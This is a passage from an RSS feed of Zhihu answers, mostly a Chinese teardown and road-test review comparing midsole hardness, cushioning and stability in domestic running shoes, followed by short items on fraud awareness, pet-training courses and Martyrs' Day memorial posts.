data-original-src=\"v2-84c8166382be664644fc05b024dca723\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p>通过中底形变图以及根据硬度测试数据对比：</p>\n<p><b>必迈的千里跑鞋属于非常韧的类型，脚感较硬；</b></p>\n<p><b>361国际线的中底由两种密度的中底组成，紫色的QUICKFOAM硬度相对较低为45C，白色的EVA中底密度调教的较硬为58C，脚感要比千里柔和很多；</b></p>\n<p><b>李宁越影的中底硬度为45C，脚感在3双鞋中为最柔和，穿在脚上也是对于初跑者最为友好；</b></p>\n<h3>2. 稳定支撑表现</h3>\n<ul><li><b>必迈42K千里</b></li></ul>\n<p><b>中足的硬质TPU抗扭片</b></p>\n<p><img src=\"https://pic3.zhimg.com/v2-dfd6d082c0b73da61a49cec0a73a14a8_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"949\" data-rawheight=\"640\" data-watermark=\"\" data-original-src=\"\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p><b>拆解后发现中底还有一块内置的小碳片</b></p>\n<p><img src=\"https://pic3.zhimg.com/v2-c04a4276e120d234d74065a724cd622e_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"793\" data-rawheight=\"535\" data-watermark=\"\" data-original-src=\"\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<ul><li><b>361国际线Spire-R</b></li></ul>\n<p><img src=\"https://pic1.zhimg.com/v2-b654e04c8ab63ba11e382f33b93ad0ae_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1028\" data-rawheight=\"694\" data-watermark=\"\" data-original-src=\"\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<ul><li>李宁越影</li></ul>\n<p><b>中底同样的硬质TPU抗扭片</b></p>\n<p><img src=\"https://pic4.zhimg.com/v2-21fce1578e670d0f0ccdc43f9ae1e3b2_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"781\" data-rawheight=\"586\" data-watermark=\"\" data-original-src=\"\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p>越影的中底看着非常厚，给人一种落地不稳的感觉，但是拆解后发现，中底并没有看起来那么厚，通过剖开断面发现越影的侧墙非常高，这种和HOKA ONE ONE的嵌入式鞋床类似的设计，在保证了落地稳定性的同时，也营造了一种极其舒适的脚感，实际跑下来也是特别的舒适</p>\n<p><img src=\"https://pic1.zhimg.com/v2-5852ec876f2008c7db1c3fbf7d1a03f0_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"874\" data-rawheight=\"655\" data-watermark=\"\" data-original-src=\"\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p><b>这种侧墙非常高的设计可以防止落地时的内外翻，起到非常强的保护作用</b></p>\n<p><img src=\"https://pic1.zhimg.com/v2-11eecfff91b62915a4ad7e02755d6233_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"696\" data-rawheight=\"850\" data-watermark=\"\" data-original-src=\"\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p>为了更直观的对比两双跑鞋的实际上脚差异，左脚穿着361国际线的Spire-R，右脚穿必迈42K千里进行了3km的慢跑测试。总结如下：</p>\n<p><b>两双中底硬度不同的跑鞋在路跑对比中，左脚的Spire-R能明显的感受到中底压缩形变缓冲作用，在对比之下右脚的必迈千里几乎感受不到中底的压缩形变过程，左右脚脚感的明显差异也让路跑非常不适应。</b></p>\n<p><b>必迈千里需要跑者具有一定的跑步基础和脚踝力量才能驾驭，而Spire-R更柔软的脚感则明显更占优一些。</b></p>\n<p><img src=\"https://pic4.zhimg.com/v2-9039643f05ee0d3217ab6d772c41bfc3_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"754\" data-rawheight=\"754\" data-watermark=\"\" data-original-src=\"\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<h3>长距离慢跑鞋总结：</h3>\n<p>对于用于LSD（长距离慢跑）的慢跑鞋，除了需要充足的缓震和保护性以外，后半程不会卸力是一个非常重要的指标。这就要求跑鞋的硬度不能太软也不能太硬，太软会导致越跑越累，太硬又会容易缓震不够对膝盖造成伤害，厂家对于中底调教的功力在这里尤为重要。</p>\n<p>必迈42K千里，361国际线Spire-R以及李宁越影三者重量几乎相同，在脚感上千里最韧，越影最软，Spire-R居其中。实际跑下来10km以上的长距离表现都非常优异，不会出现后半程卸力的问题。</p>\n<p><b>必迈42K千里对于跑者自身的肌力要求较高，不建议初跑者入手；</b></p>\n<a data-draft-node=\"block\" data-draft-type=\"mcn-link-card\" data-mcn-id=\"1429789786891038721\"></a><p><b>361国际线的Spire-R居于两者之间，有一定跑步基础的跑者都可以轻松驾驭；</b></p>\n<a data-draft-node=\"block\" data-draft-type=\"mcn-link-card\" data-mcn-id=\"1429790018802335744\"></a><p><b>李宁越影柔软舒适的脚感是让初跑者也可以轻松驾驭的跑鞋，应该是三种长距离跑鞋中对跑者自身水平要求最低的跑鞋；</b></p>\n<a data-draft-node=\"block\" data-draft-type=\"mcn-link-card\" data-mcn-id=\"1429790749106188289\"></a><h2>三. 大体重跑鞋</h2>\n<p>这里的大体重跑鞋并不是指只有大体重才可以穿的跑鞋，而是指大体重穿会更合适。因为大体重跑鞋在缓震足够的前提下普遍重量相对较重（单只重量一般超过300g，甚至达到400g），中小体重有更轻量化的选择，比如上面说的三双。</p>\n<table data-draft-node=\"block\" data-draft-type=\"table\" data-size=\"normal\" data-row-style=\"normal\"><tbody>\n<tr>\n<td></td>\n<td>安踏创1.5</td>\n<td>多威反重力</td>\n<td>特步动力巢</td>\n</tr>\n<tr>\n<td>重量（g）</td>\n<td>350g</td>\n<td>398g</td>\n<td>393g</td>\n</tr>\n<tr>\n<td>邵氏硬度</td>\n<td>45C</td>\n<td>45C/58C</td>\n<td>42C</td>\n</tr>\n</tbody></table>\n<h3>1. 缓震回弹表现</h3>\n<p>安踏创1.5中底压缩变形gif图</p>\n<p><img src=\"https://pic1.zhimg.com/v2-3e54bf4f0372e06eb58b7518c84099c4_720w.gif?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"600\" data-rawheight=\"381\" data-watermark=\"watermark\" data-original-src=\"v2-3e54bf4f0372e06eb58b7518c84099c4\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p>多威反重力中底压缩变形gif图</p>\n<p><img src=\"https://pic2.zhimg.com/v2-5a70ee6d36dfa7ca85ee41ce3da900a6_720w.gif?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"599\" data-rawheight=\"366\" data-watermark=\"watermark\" data-original-src=\"v2-5a70ee6d36dfa7ca85ee41ce3da900a6\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p><b>多威反重力跑鞋后跟处有另一种硬度较软的中底材料，可以为后跟跑法的初跑者提供更柔软的脚感</b></p>\n<p><img src=\"https://pic3.zhimg.com/v2-181458bebfff8dcc4c87f8f0c082087b_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"971\" data-rawheight=\"728\" data-watermark=\"\" data-original-src=\"\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p>特步动力巢中底压缩变形gif图</p>\n<p><img src=\"https://pic2.zhimg.com/v2-de2c63af70c9e622eaddd97e12c08287_720w.gif?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"600\" data-rawheight=\"412\" data-watermark=\"watermark\" data-original-src=\"v2-de2c63af70c9e622eaddd97e12c08287\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p>对三双跑鞋的中底形变gif图以及实际路跑测试对比：</p>\n<p><b>创1.5</b>的脚感介于三者中间，实际路跑测试10km，72kg的体重跑下来远远没有达到缓震极限。而且改进了创1.0第一代的前掌缓震不足的问题，脚感也相对多威反重力更柔和一些；</p>\n<p><b>多威反重力</b>跑鞋的中底硬度较高，路跑过程中也几乎感觉不到中底的压缩变形，但是并不代表没有缓震，而是给人一种很韧的感觉，我是前掌跑法，后跟跑法的初跑者缓震感会更强一些，缓震极限要远超另外两双，长距离跑是它相对其他两双的优势；</p>\n<p><b>特步动力巢</b>是三双中踩屎感最强的跑鞋，脚感类似阿迪达斯的Boost，过于柔软的脚感也是三双中最不适合跑长距离的跑鞋，5km以上建议穿另外两双，但是街穿会非常舒服；</p>\n<h3>2. 稳定支撑表现</h3>\n<p>安踏创1.5中足的耐磨橡胶起到类似的抗扭作用</p>\n<p><img src=\"https://pic3.zhimg.com/v2-8c91bd135126615d9b3c13ac1ef1327f_720w.png?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"2135\" data-rawheight=\"1440\" data-watermark=\"watermark\" data-original-src=\"v2-8c91bd135126615d9b3c13ac1ef1327f\" data-watermark-src=\"v2-6ca01fef83500362fc628a5dde6ca240\" data-private-watermark-src=\"v2-f665ac63bc82d1860e3c95a58f988271\"></p>\n<p>两侧的TPU从后跟延伸到中足起到防侧翻作用</p>\n<p><img src=\"https://pic1.zhimg.com/v2-5967b06375b01adf096f3f1a213f6270_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"946\" data-rawheight=\"710\" data-watermark=\"\" data-original-src=\"\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p><b>多威反重力内置一块X形小碳板起到抗扭转作用-拆解图</b></p>\n<p><img src=\"https://pic3.zhimg.com/v2-d9aaa774096827c0e26d02ca40956b3c_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"836\" data-rawheight=\"627\" data-watermark=\"\" data-original-src=\"\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p>从后跟延伸到中足的内置硬质TPU片起到防侧翻作用</p>\n<p><img src=\"https://pic1.zhimg.com/v2-c96e5c0a019a47c457e908fdf2828376_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"912\" data-rawheight=\"684\" data-watermark=\"\" data-original-src=\"\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p>特步动力巢中足的连续耐磨橡胶起到类似的抗扭转作用</p>\n<p><img src=\"https://pic4.zhimg.com/v2-46650f9d4c74f3a15f9201f099c507b6_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"862\" data-rawheight=\"647\" data-watermark=\"\" data-original-src=\"\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p>同样从后跟延伸的中足的外置黑色硬质TPU片起到防侧翻作用</p>\n<p><img src=\"https://pic3.zhimg.com/v2-7bf00aaa254261c66c3dc145c1b635fc_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"914\" data-rawheight=\"686\" data-watermark=\"\" data-original-src=\"\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p><b>作为大体重跑者的跑鞋，三双均有不错的稳定支撑表现。</b></p>\n<p>同时为了更直观的进行对比实际上脚差异，左脚穿多威反重力，右脚穿特步动力巢进行了2km的路跑测试。总结如下：</p>\n<p>从刚开始跑的第一步几乎就感受到了两双跑鞋的巨大差异，右脚的动力巢每一步都能感受到中底材料的压缩变形，而左脚的反重力几乎感受不到变形的存在，好像左脚在赤脚跑一样，很明显动力巢在追求踩屎感。<b>——如果只是在鞋店走路试穿的话，我可能会毫不犹豫的选择动力巢。</b></p>\n<p><b>随着跑步的继续，由于右脚动力巢的压缩形变行程非常长，而且因为回弹不明显，所以触地时间也会变长，有些许卸力；</b></p>\n<p><b>此时左脚的反重力跑鞋虽然没有脚踩棉花一样的柔软脚感，但是还是能感受到那种比较韧的缓震，越往后跑会越舒服；</b></p>\n<p>因为两只脚的脚感差异实在是太大，所以只跑了2km。</p>\n<p><img src=\"https://pic2.zhimg.com/v2-fbb0681eec8686fa72fb6a92cc2fa88d_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"857\" data-rawheight=\"857\" data-watermark=\"\" data-original-src=\"\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<h3>大体重跑鞋总结：</h3>\n<p>选购大体重跑鞋时首要的永远是充足的缓震，在缓震充足的前提下再考虑重量耐磨等等因素。</p>\n<p><b>安踏创1.5 44码350g的重量，脚感介于反重力和动力巢之间，缓震极限上比反重力和动力巢弱一些，但是也足够了。对于大体重有一定跑步基础的跑者，这会是一双相对轻量的高性价比选择；</b></p>\n<a data-draft-node=\"block\" data-draft-type=\"mcn-link-card\" data-mcn-id=\"1429792259554717696\"></a><p><b>多威反重力44码398g的重量，脚感虽然在三双中最硬，可是其优异的长距离表现，绵韧的脚感，让大体重跑者可以放心的慢跑，长距离也可以驾驭；</b></p>\n<a data-draft-node=\"block\" data-draft-type=\"mcn-link-card\" data-mcn-id=\"1429792415486525440\"></a><p><b>特步动力巢44码393g的重量，有着最柔软的脚感，是三双中最不适合长距离的跑鞋，最适合大体重跑者休闲跑的跑鞋；</b></p>\n<a data-draft-node=\"block\" data-draft-type=\"mcn-link-card\" data-mcn-id=\"1429793042647289856\"></a><h2><b>拆解测评为什么要一直做下去</b></h2>\n<p>本次从前期调研采买，参数测试，路跑测试，再到拆解测评，左右脚不同型号跑鞋对比测评，一双跑鞋的选购要经历太多太多坑。</p>\n<p>虽然之前也一直在做国产跑鞋的测评，但是这次这么大规模的一次性8双一起测评还是第一次。也可以看到国产跑鞋一直在进步，从最开始的初级产品匹克态极1.0到如今成熟的态极3.0；从前掌缓震太弱的安踏创1.0到现在轻松跑10km的安踏创1.5。虽然现在和国外品牌还有一定的差距，但是这个差距在不断缩小，也希望国产品牌能够保持初心，继续一如既往的把精力放在提升产品力上，而不是去把精力花在如何忽悠消费者以及博眼球上。</p>\n<p>而对于自己拆解测评的意义，也在这次测评之后找到了答案：</p>\n<p><b>在拆解过程中发现了碳板营销噱头</b></p>\n<p><img src=\"https://pic4.zhimg.com/v2-8048caf4cc836ad6f339b6e0aa148b67_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"843\" data-rawheight=\"569\" data-watermark=\"\" data-original-src=\"\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p><b>在拆解过程中发现了高侧墙的巧妙设计</b></p>\n<p><img src=\"https://pic4.zhimg.com/v2-3743d6f180ab9bd7c8b8513ece6fc274_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"782\" data-rawheight=\"919\" data-watermark=\"\" data-original-src=\"\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p><b>而左右脚穿不同跑鞋对比测评的脚感差异如此之明显则是意外的惊喜：</b></p>\n<b></b><p><img src=\"https://pic1.zhimg.com/v2-dd8674e91da0e0a8796405bbf3307319_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"808\" data-rawheight=\"808\" data-watermark=\"\" data-original-src=\"\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p><b>一直在探索如何才能更全面的测评一款甚至多款跑鞋，如何能更直观的展现不同跑鞋的区别，为跑友提供更直观更准确的跑鞋选购参考。</b></p>\n<p><b>现在也找到了答案：</b></p>\n<p><b>拆——跑鞋拆解会一直做下去，让隐藏在内部的缺陷无处遁形，也让好的设计被更多人知道</b></p>\n<p><b>跑——左右脚不同跑鞋对比路跑测评也会一直做下去，后面会在保证安全的前提下增加单次跑步的里程数，提供更精准的对比</b></p>\n<p>也感谢知乎跑友们一直以来的支持，让我们一起跑下去，我也会一直测下去</p>\n<p>以上 <a class=\"member_mention\" href=\"http://www.zhihu.com/people/97df7cdff4aba088348f297560c591a2\" data-hash=\"97df7cdff4aba088348f297560c591a2\" data-hovercard=\"p$b$97df7cdff4aba088348f297560c591a2\">@Seeker</a> </p>\n<p></p>\n<br><br>\n来源：知乎 www.zhihu.com<br>\n    \n作者：<a href=\"http://www.zhihu.com/people/tan-suo-19?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=author\">Seeker</a><br><br>\n【知乎日报】千万用户的选择，做朋友圈里的新鲜事分享大牛。\n        <a href=\"http://daily.zhihu.com/?utm_source=rssyanwenzi&amp;utm_campaign=tuijian&amp;utm_medium=rssnormal\" target=\"_blank\">点击下载</a><br><br>\n此问题还有 <a href=\"http://www.zhihu.com/question/55577787/answer/1599673325?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">44 个回答，查看全部。</a><br>\n                延伸阅读：<br><a href=\"http://www.zhihu.com/question/399087550?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">跑鞋如何补救?</a><br><a href=\"http://www.zhihu.com/question/487844271?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">有没有那些两三百性价比高 不丑的跑鞋?</a><br>\n","link":"http://www.zhihu.com/question/55577787/answer/1599673325?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title"},{"title":"为什么反诈这么难？","date":"2021-10-08 04:04:16","description":"假期第五天，反诈不打烊！上一期说到了电信网络诈骗的特点，这一期来和大家聊聊关于“诈骗套路”的那些事。想知道骗子是如何行骗的吗？咱们又该如何提高警惕呢？为大家送上“反诈宝典”，请注意查收！\n<br><br>\n来源：知乎 www.zhihu.com<br>\n    \n作者：<a href=\"http://www.zhihu.com/people/zhong-guo-san-nong-fa-bu?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=author\">中国三农发布</a><br><br>\n【知乎日报】千万用户的选择，做朋友圈里的新鲜事分享大牛。\n        <a href=\"http://daily.zhihu.com/?utm_source=rssyanwenzi&amp;utm_campaign=tuijian&amp;utm_medium=rssnormal\" target=\"_blank\">点击下载</a><br><br>\n此问题还有 <a href=\"http://www.zhihu.com/question/480359619/answer/2156264041?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">64 个回答，查看全部。</a><br>\n                延伸阅读：<br><a href=\"http://www.zhihu.com/question/422987372?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">如何看待2020年电信诈骗呈井喷式增长，甚至还有一些警察被骗，全国人民无时无刻不在承受着骗子的骚扰。？</a><br><a href=\"http://www.zhihu.com/question/442354509?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">为什么遇到诈骗 ，诈骗人伏法了，但人民追不回损失？</a><br>\n","link":"http://www.zhihu.com/question/480359619/answer/2156264041?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title"},{"title":"怎么看待中国市场上的宠物训练及训练师培训？","date":"2021-10-08 04:03:40","description":"这几年，职业教育越来越受到大家关注，目前我国共有职业学校1.13万所，在校生3088万人。随着社会的多元化发展，出现了很多新兴职业，而职业教育也提档升级，开设了更多适应现在社会生活需要的专业。最近宠物养护专业挺火，全国目前大约有20所职业学校都开办了相关的专业课程。我们的职教“体验官”就带您去看看这个专业都学些啥？\n<br><br>\n来源：知乎 www.zhihu.com<br>\n    \n作者：<a href=\"http://www.zhihu.com/people/zhong-guo-san-nong-fa-bu?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=author\">中国三农发布</a><br><br>\n【知乎日报】千万用户的选择，做朋友圈里的新鲜事分享大牛。\n        <a href=\"http://daily.zhihu.com/?utm_source=rssyanwenzi&amp;utm_campaign=tuijian&amp;utm_medium=rssnormal\" target=\"_blank\">点击下载</a><br><br>\n此问题还有 <a href=\"http://www.zhihu.com/question/66395101/answer/2157881360?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">2 个回答，查看全部。</a><br>\n                延伸阅读：<br><a href=\"http://www.zhihu.com/question/38158495?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">新人想走训犬这条路应该怎样入行和有哪些注意事项？</a><br><a href=\"http://www.zhihu.com/question/311294737?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">哪里可以找到顶尖的训犬师？</a><br>\n","link":"http://www.zhihu.com/question/66395101/answer/2157881360?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title"},{"title":"9 月 30 日是烈士纪念日，今天该如何缅怀他们，才能走得更有力？","date":"2021-10-08 04:02:26","description":"\n<p><b>国庆前一天，是烈士纪念日！</b>若无9月30日，何来10月01日？</p>\n<p>正是昭示了<b>中国从苦难到辉煌的艰难历程，</b>要人们铭记<b>幸福的生活从哪里来，我们的出发点在哪里</b></p>\n<p>就在烈士纪念日前夕，2021年9月28日，在退役军人事务部指导下，<b>中国退役军人关爱基金会“英烈关爱基金”正式设立。“致敬英烈 关爱烈属”公益募捐活动同时正式启动。</b></p>\n<p>哨位君在现场见证了这一时▼</p>\n<p><img src=\"https://pic2.zhimg.com/v2-6d19956edfcbe4303e1db014a4aab926_720w.webp?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"486\" data-watermark=\"watermark\" data-original-src=\"v2-6d19956edfcbe4303e1db014a4aab926\" data-watermark-src=\"v2-edb9c42a1b6ac3f798d2d6c043684bfd\" data-private-watermark-src=\"v2-fc0fef35d3b36cd8318c3ea02eafb852\"></p>\n<p><b>铭记烈士的功绩，关爱好烈士遗属，</b>正是烈士纪念日的应有之义。</p>\n<p>近日边防某团官兵在战位缅怀边境牺牲的烈士▼</p>\n<p><img src=\"https://pic2.zhimg.com/v2-6fb58e1e4645cc4c3e3c3366036b1a53_720w.webp?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"506\" data-rawheight=\"807\" data-watermark=\"watermark\" data-original-src=\"v2-6fb58e1e4645cc4c3e3c3366036b1a53\" data-watermark-src=\"v2-d06a7141fbe3e9e82efd2af07d8cbd03\" data-private-watermark-src=\"v2-143375a7c4781b0c5e9507e9f5eb3ff0\"></p>\n<p><br></p>\n<p><b>英雄，民敬仰，事迹，永不忘。</b>不论何时不论何地<b>永远不要忘了那2000万为国牺牲的英灵。</b></p>\n<p><b>你若记得，他便无悔。</b></p>\n<br><br>\n来源：知乎 www.zhihu.com<br>\n    \n作者：<a href=\"http://www.zhihu.com/people/yihao-shao-wei-11?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=author\">一号哨位</a><br><br>\n【知乎日报】千万用户的选择，做朋友圈里的新鲜事分享大牛。\n        <a href=\"http://daily.zhihu.com/?utm_source=rssyanwenzi&amp;utm_campaign=tuijian&amp;utm_medium=rssnormal\" target=\"_blank\">点击下载</a><br><br>\n此问题还有 <a href=\"http://www.zhihu.com/question/489785273/answer/2147954899?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">234 个回答，查看全部。</a><br>\n                延伸阅读：<br><a href=\"http://www.zhihu.com/question/489687295?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">今天是我国第八个烈士纪念日。我们可以通过怎样的方式来纪念他们？你有哪些话，想对英烈诉说？</a><br><a href=\"http://www.zhihu.com/question/319927345?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">去参加烈士陵园可以发朋友圈吗？</a><br>\n","link":"http://www.zhihu.com/question/489785273/answer/2147954899?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title"},{"title":"9 月 30 日是烈士纪念日，今天该如何缅怀他们，才能走得更有力？","date":"2021-10-08 03:59:24","description":"\n<p><b>大好河山  寸土不让</b></p>\n<p>二零二零年六月</p>\n<p>边境线上突发战斗</p>\n<p>4位英雄的边防官兵</p>\n<p>将宝贵生命永远留在了战位</p>\n<p>国家烈士纪念日之际</p>\n<p>新疆军区某团官兵</p>\n<p>来到烈士们战斗过的地方</p>\n<p>缅怀英雄、继承遗志</p>\n<a href=\"https://www.zhihu.com/video/1426872682319519744\"></a><p>（视频剪辑：徐立玲）</p>\n<p>喀喇昆仑山见证</p>\n<p>加勒万河谷铭记</p>\n<p>你们用生命捍卫祖国尊严</p>\n<p>我们用青春抒写如山承诺</p>\n<p><img src=\"https://pic2.zhimg.com/v2-378018133dcfcb91136e8a77b1e0419f_720w.gif?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"512\" data-rawheight=\"288\" data-watermark=\"original\" data-original-src=\"v2-378018133dcfcb91136e8a77b1e0419f\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p>活动现场</p>\n<p><br>气氛庄严肃穆</p>\n<p>参加仪式的官兵</p>\n<p>紧握手中钢枪静静肃立</p>\n<p>深切哀悼陈红军、陈祥榕</p>\n<p>肖思远、王焯冉四位烈士</p>\n<p><img src=\"https://pic2.zhimg.com/v2-a4bb521dc97cfef43588400c8a8b9b0b_720w.gif?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"512\" data-rawheight=\"288\" data-watermark=\"original\" data-original-src=\"v2-a4bb521dc97cfef43588400c8a8b9b0b\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p>一起带孩子、做饭、钓鱼……</p>\n<p>这是陈红军烈士给妻子的承诺</p>\n<p>发520元的微信红包给妈妈</p>\n<p>这是肖思远烈士表达爱意的方式</p>\n<p>“如果我死了，照顾好我老娘”</p>\n<p>这是王焯冉烈士牺牲前留给战友的话</p>\n<p>“清澈的爱，只为中国”</p>\n<p>这是陈祥榕烈士用生命完成的誓言</p>\n<p>此刻，官兵们用深深的哀悼</p>\n<p>表达对战友的无尽思念</p>\n<p><img src=\"https://pic3.zhimg.com/v2-28f2ef8adc1ab54c1a0f075b9f07a4c7_720w.gif?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"512\" data-rawheight=\"288\" data-watermark=\"original\" data-original-src=\"v2-28f2ef8adc1ab54c1a0f075b9f07a4c7\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p>崇尚英雄才会产生英雄</p>\n<p>争做英雄才能英雄辈出</p>\n<p>听，铮铮誓言</p>\n<p>如你们一般铿锵</p>\n<p>看，挺拔身姿</p>\n<p>如你们一般坚韧</p>\n<p>英勇战斗，不怕牺牲</p>\n<p>人民军队的英雄基因生生不息</p>\n<p><img src=\"https://pic3.zhimg.com/v2-d8898372e6d94c2f340af02d3cff5e7b_720w.gif?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"512\" data-rawheight=\"288\" data-watermark=\"original\" data-original-src=\"v2-d8898372e6d94c2f340af02d3cff5e7b\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p>肖思远烈士牺牲后</p>\n<p>战友们接过肖班长的接力棒</p>\n<p>光荣地坚守战位</p>\n<p>用行动传承发扬</p>\n<p>誓死捍卫祖国领土完整的</p>\n<p>“尖刀班”精神</p>\n<p><img src=\"https://pic1.zhimg.com/v2-f7731f59d6163fc89ad31badb4f46008_720w.gif?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"512\" data-rawheight=\"288\" data-watermark=\"original\" data-original-src=\"v2-f7731f59d6163fc89ad31badb4f46008\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p>一个战士，就是一个界碑</p>\n<p>彻夜不寐</p>\n<p>只为身后安眠无忧</p>\n<p>血染沙场</p>\n<p>方能护佑万家灯火</p>\n<p>请烈士们放心</p>\n<p>战友们正踏着你们的足迹</p>\n<p>守卫这片深爱的土地</p>\n<p><img src=\"https://pic1.zhimg.com/v2-4276328cb52e4a3874d3095f74b26eae_720w.gif?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"512\" data-rawheight=\"288\" data-watermark=\"original\" data-original-src=\"v2-4276328cb52e4a3874d3095f74b26eae\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p>我把青春融进祖国的山河</p>\n<p>山知道我，江河知道我</p>\n<p>祖国不会忘记</p>\n<p>不会忘记我</p>\n<p>因为，我站立的地方是祖国</p>\n<p>五星红旗永远是我</p>\n<p>最值得的骄傲</p>\n<p><img src=\"https://pic2.zhimg.com/v2-ac5412763154347dc02622605e915375_720w.gif?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"512\" data-rawheight=\"288\" data-watermark=\"original\" data-original-src=\"v2-ac5412763154347dc02622605e915375\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p><b>千里热血边关</b></p>\n<p><b>遍地英雄屹立</b></p>\n<p><b>大好河山，寸土不让！</b></p>\n<br><br>\n来源：知乎 www.zhihu.com<br>\n    \n作者：<a href=\"http://www.zhihu.com/people/xi-bu-zhan-qu-3?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=author\">西部战区</a><br><br>\n【知乎日报】千万用户的选择，做朋友圈里的新鲜事分享大牛。\n        <a href=\"http://daily.zhihu.com/?utm_source=rssyanwenzi&amp;utm_campaign=tuijian&amp;utm_medium=rssnormal\" target=\"_blank\">点击下载</a><br><br>\n此问题还有 <a href=\"http://www.zhihu.com/question/489785273/answer/2147845424?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">234 个回答，查看全部。</a><br>\n                延伸阅读：<br><a href=\"http://www.zhihu.com/question/489687295?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">今天是我国第八个烈士纪念日。我们可以通过怎样的方式来纪念他们？你有哪些话，想对英烈诉说？</a><br><a 